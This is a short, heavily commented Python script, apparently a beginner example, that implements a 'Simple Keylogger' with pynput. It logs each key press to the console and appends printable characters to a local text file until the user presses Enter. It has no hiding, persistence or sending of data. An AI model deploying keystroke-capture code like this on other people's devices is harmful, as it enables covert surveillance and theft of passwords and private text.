#Import this library to detect and respond to key presses
from pynput import keyboard

print("//////////////////////////////////////////////////////////")
print("                  Simple Keylogger")
print("//////////////////////////////////////////////////////////")
print(" ")

# Function defined which runs every time a key is pressed
def keyPressed(key):
# Print the pressed key to the console
    print(str(key))
# Creates a file in append mode
    with open("KeyPressfile.txt","a") as logKey:
        try:
# Try to get the actual character (like "a", "b", "1", "#") from the key
            char=key.char 
# Write that character into the file
            logKey.write(char)
        except:
# If key pressed is a special character like 'Shift','Ctrl',etc, then this line will run instead of the program crashing            
            print("Error getting char")  
              
if __name__ =="__main__":
# When a key is pressed, it calls the "keyPressed" function above
    listener =keyboard.Listener(on_press=keyPressed)
# Starts to listening for key presses by the user
    listener.start()
#Runs the program until user press Enter in the console
    input()
